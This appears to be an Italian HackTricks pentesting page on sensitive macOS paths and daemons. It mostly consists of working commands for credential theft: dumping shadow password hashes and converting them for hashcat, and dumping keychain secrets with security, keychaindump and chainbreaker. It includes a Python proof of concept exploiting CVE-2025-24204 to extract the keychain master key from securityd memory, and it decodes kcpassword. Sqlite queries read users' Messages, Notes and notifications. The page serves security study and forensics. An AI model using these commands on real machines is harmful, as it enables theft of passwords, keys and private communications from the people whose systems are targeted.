# Percorsi sensibili e daemon interessanti di macOS

{{#include ../../../banners/hacktricks-training.md}}


## Password

### Shadow Password

Le shadow password sono memorizzate con la configurazione dell'utente nei plist situati in **`/var/db/dslocal/nodes/Default/users/`**.\
La seguente one-liner può essere usata per scaricare **tutte le informazioni sugli utenti** (incluse le informazioni sugli hash):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Script come questo**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**questo**](https://github.com/octomagon/davegrohl.git) possono essere usati per convertire l'hash nel **formato** **hashcat**.

Un one-liner alternativo che estrae le credenziali di tutti gli account non di servizio nel formato hashcat `-m 7100` (PBKDF2-SHA512 di macOS):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Un altro modo per ottenere `ShadowHashData` di un utente è usare `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Convertire ShadowHashData su Linux

Se l'attributo è stato copiato su un cracking host Linux, salva **solo i byte esadecimali** (non l'etichetta `ShadowHashData:`) in `shadowhash.hex`. Su Ubuntu, `libplist-utils` converte il plist binario decodificato in XML leggibile senza `plutil` di macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

Nell'XML, usa `iterations` e i valori base64 di `salt` ed `entropy` di **`SALTED-SHA512-PBKDF2`**, non il verificatore SRP separato. Imposta `salt_b64` e `entropy_b64` sui rispettivi contenuti XML di `<data>`. Decodificali in esadecimale e componi una riga nel formato `$ml$<iterations>$<salt_hex>$<entropy_hex>` per la modalità Hashcat `7100`. Si tratta di un tentativo offline di indovinare la password dopo aver ottenuto gli hash con privilegi elevati, non di un metodo di accesso iniziale o di escalation dei privilegi.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Questo file viene **usato solo** quando il sistema è in esecuzione in **single-user mode** (quindi non molto spesso).

### Dump del Keychain

Nota che, quando si usa il binario `security` per **eseguire il dump delle password decrittate**, verrà chiesto più volte all'utente di autorizzare questa operazione.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Su macOS moderno, gli archivi sottostanti più interessanti sono solitamente **`~/Library/Keychains/login.keychain-db`** e **`/Library/Keychains/System.keychain`**. Sono file basati su SQLite, ma l'accesso in chiaro è comunque gestito da **`securityd`**: rubare il DB grezzo fornisce principalmente metadati e blob cifrati, a meno che non si recuperino anche la password dell'utente, `SystemKey` o una master key presente in memoria.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> In base a questo commento [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), sembra che questi strumenti non funzionino più su Big Sur.

### Panoramica di Keychaindump

È stato sviluppato uno strumento chiamato **keychaindump** per estrarre password dai keychain di macOS, ma presenta limitazioni sulle versioni più recenti di macOS, come Big Sur, come indicato in una [discussione](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'uso di **keychaindump** richiede che l'attaccante ottenga l'accesso e aumenti i privilegi a **root**. Lo strumento sfrutta il fatto che, per comodità, il keychain viene sbloccato per impostazione predefinita quando l'utente effettua il login, consentendo alle applicazioni di accedervi senza richiedere ripetutamente la password dell'utente. Tuttavia, se l'utente sceglie di bloccare il keychain dopo ogni utilizzo, **keychaindump** diventa inefficace.

**Keychaindump** agisce prendendo di mira un processo specifico chiamato **securityd**, descritto da Apple come un daemon per le operazioni di autorizzazione e crittografia, fondamentale per accedere al keychain. Il processo di estrazione prevede l'individuazione di una **Master Key** derivata dalla password di login dell'utente. Questa chiave è essenziale per leggere il file del keychain. Per individuare la **Master Key**, **keychaindump** analizza l'heap di memoria di **securityd** usando il comando `vmmap`, cercando potenziali chiavi nelle aree contrassegnate come `MALLOC_TINY`. Per esaminare queste posizioni di memoria si usa il comando seguente:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Dopo aver identificato le potenziali master key, **keychaindump** cerca negli heap uno specifico pattern (`0x0000000000000018`) che indica una possibile master key. Per utilizzare questa chiave sono necessari ulteriori passaggi, tra cui la deobfuscation, come descritto nel codice sorgente di **keychaindump**. Gli analisti che si concentrano su quest’area devono tenere presente che i dati fondamentali per decrittare il keychain sono archiviati nella memoria del processo **securityd**. Un esempio di comando per eseguire **keychaindump** è:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) può estrarre i seguenti tipi di informazioni da un portachiavi macOS in modo forense affidabile:

- Password del portachiavi sottoposta ad hashing, adatta al cracking con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
- Password Internet
- Password generiche
- Chiavi private
- Chiavi pubbliche
- Certificati X509
- Note sicure
- Password Appleshare

Se gli viene fornita la password di sblocco del portachiavi, una master key ottenuta con [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), oppure un file di sblocco come SystemKey, Chainbreaker fornirà anche le password in testo in chiaro.

Senza uno di questi metodi per sbloccare il portachiavi, Chainbreaker mostrerà tutte le altre informazioni disponibili.

#### **Dump delle chiavi del portachiavi**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump delle chiavi del portachiavi (con password) con SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump delle chiavi del keychain (con password) e cracking dell'hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump delle chiavi keychain (con password) con memory dump**

[Segui questi passaggi](../index.html#dumping-memory-with-osxpmem) per eseguire un **memory dump**.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump delle chiavi del keychain (con password) usando la password dell'utente**

Se conosci la password dell'utente, puoi usare questa password per **eseguire il dump e decifrare i keychain appartenenti all'utente**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Chiave master del Keychain tramite entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) includeva `/usr/bin/gcore` con l’entitlement **`com.apple.system-task-ports.read`**, quindi qualsiasi admin locale (o app firmata malevola) poteva scaricare la memoria di **qualsiasi processo anche con SIP/TCC attivi**. Il dump di `securityd` espone la **chiave master del Keychain** in chiaro e consente di decrittare `login.keychain-db` senza la password dell’utente.<sup>[[1]](#references)</sup>

**Riproduzione rapida sulle versioni vulnerabili (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Passa la chiave esadecimale estratta a Chainbreaker (`--key <hex>`) per decrittare il login keychain. Apple ha rimosso l’entitlement in **macOS 15.3+**, quindi funziona solo sulle build di Sequoia non patchate o sui sistemi che hanno mantenuto il binario vulnerabile.

### kcpassword

Il file **kcpassword** contiene la **password di login dell’utente**, ma solo se il proprietario del sistema ha **abilitato il login automatico**. L’utente verrà quindi autenticato automaticamente, senza che gli venga chiesta la password (il che non è molto sicuro).

La password è memorizzata nel file **`/etc/kcpassword`**, sottoposta a XOR con la chiave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se la password dell’utente è più lunga della chiave, la chiave verrà riutilizzata.\
Questo rende la password piuttosto facile da recuperare, ad esempio usando script come [**questo**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informazioni interessanti nei database

### Messaggi

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifiche

Prima di **Sequoia**, di solito è possibile trovare il database del Centro Notifiche in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+**, Apple lo ha spostato nel group container protetto da TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La maggior parte delle informazioni interessanti è archiviata in colonne **blob**, quindi sarà necessario estrarre quei contenuti e trasformarli in un formato leggibile (`plutil -p -`, `strings` o un piccolo parser). Esempi di triage rapido:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Recenti problemi di privacy (DB di NotificationCenter)

- In macOS **14.7–15.1**, Apple archiviava il contenuto dei banner nel database SQLite `db2/db` senza un'adeguata redazione. Le CVE **CVE-2024-44292/44293/40838/54504** consentivano a qualsiasi utente locale di leggere il testo delle notifiche degli altri utenti semplicemente aprendo il DB (senza richiesta TCC).<sup>[[3]](#references)</sup>
- Apple ha mitigato il problema spostando il DB in `group.com.apple.usernoted` e proteggendolo con TCC nelle versioni più recenti di Sequoia; sui sistemi attuali, quindi, normalmente serve il contesto dell'utente corretto o un bypass di TCC per leggerlo.<sup>[[4]](#references)</sup>
- Sugli endpoint legacy, copia insieme i file `db`, `db-wal` e `db-shm` prima di aggiornare o riavviare, se vuoi conservare gli artefatti.

### Note

Le note degli utenti si trovano in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Se la one-liner sopra è troppo rumorosa, esporta `ZICNOTEDATA.ZDATA`, decomprimilo con gunzip e analizza il protobuf: di solito è più affidabile che eseguire `strings` direttamente sul database SQLite.

### Attività in background / Elementi di login

A partire da **Ventura**, gli elementi di login approvati dall’utente e diverse attività in background vengono registrati negli archivi **BTM**, come **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** e la cache di sistema con versione **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Questi file sono utili per identificare rapidamente la persistence, gli strumenti helper e alcuni elementi in background gestiti tramite MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Per l'aspetto della persistenza e gli interni di BTM, consulta [la pagina sulle posizioni di avvio automatico](../../macos-auto-start-locations.md#login-items) e [le note su Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferenze

In macOS, le preferenze delle app si trovano in **`$HOME/Library/Preferences`**; in iOS si trovano in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS, lo strumento CLI **`defaults`** può essere usato per **modificare il file delle preferenze**.

**`/usr/sbin/cfprefsd`** dichiara i servizi XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e può essere invocato per eseguire azioni come la modifica delle preferenze.

## OpenDirectory permissions.plist

Il file `/System/Library/OpenDirectory/permissions.plist` contiene le autorizzazioni applicate agli attributi dei nodi ed è protetto da SIP.\
Questo file concede autorizzazioni a utenti specifici tramite UUID (e non uid), consentendo loro di accedere a informazioni sensibili specifiche come `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys`, tra le altre:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Notifiche di sistema

### Notifiche Darwin

Il daemon principale per le notifiche è **`/usr/sbin/notifyd`**. Per ricevere notifiche, i client devono registrarsi tramite la porta Mach `com.apple.system.notification_center` (verificali con `sudo lsmp -p <pid notifyd>`). Il daemon è configurabile tramite il file `/etc/notify.conf`.

I nomi usati per le notifiche sono notazioni DNS inverse univoche e, quando viene inviata una notifica a uno di essi, la ricevono i client che hanno indicato di poterla gestire.

È possibile scaricare lo stato corrente (e vedere tutti i nomi) inviando il segnale SIGUSR2 al processo notifyd e leggendo il file generato: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

Il **Distributed Notification Center**, il cui binario principale è **`/usr/sbin/distnoted`**, è un altro modo per inviare notifiche. Espone alcuni servizi XPC ed esegue alcuni controlli per provare a verificare i client.

### Apple Push Notifications (APN)

In questo caso, le applicazioni possono registrarsi per dei **topics**. Il client genererà un token contattando i server Apple tramite **`apsd`**.\
I provider avranno a loro volta generato un token e potranno connettersi ai server Apple per inviare messaggi ai client. Questi messaggi saranno ricevuti localmente da **`apsd`**, che inoltrerà la notifica all'applicazione in attesa.

Le preferenze si trovano in `/Library/Preferences/com.apple.apsd.plist`.

In macOS, è presente un database locale dei messaggi in `/Library/Application\ Support/ApplePushService/aps.db`; in iOS si trova in `/var/mobile/Library/ApplePushService`. Contiene 3 tabelle: `incoming_messages`, `outgoing_messages` e `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

È inoltre possibile ottenere informazioni sul daemon e sulle connessioni usando:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Notifiche utente

Queste notifiche sono visibili all’utente sullo schermo:

- **`CFUserNotification`**: queste API consentono di mostrare sullo schermo un pop-up con un messaggio.
- **The Bulletin Board**: in iOS mostra un banner che scompare e viene salvato nel Centro notifiche.
- **`NSUserNotificationCenter`**: il servizio legacy del Centro notifiche su macOS. Nelle versioni meno recenti, il database si trova in genere in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; da Sequoia in poi, è stato spostato in `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – L’entitlement gcore di macOS ha consentito l’estrazione della chiave master del Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Protezione dei dati del Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Divulgazione tramite SQLite del Centro notifiche (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple affronta le questioni di privacy relative al database del Centro notifiche in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Password Cracking su macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat – Hash di esempio: macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
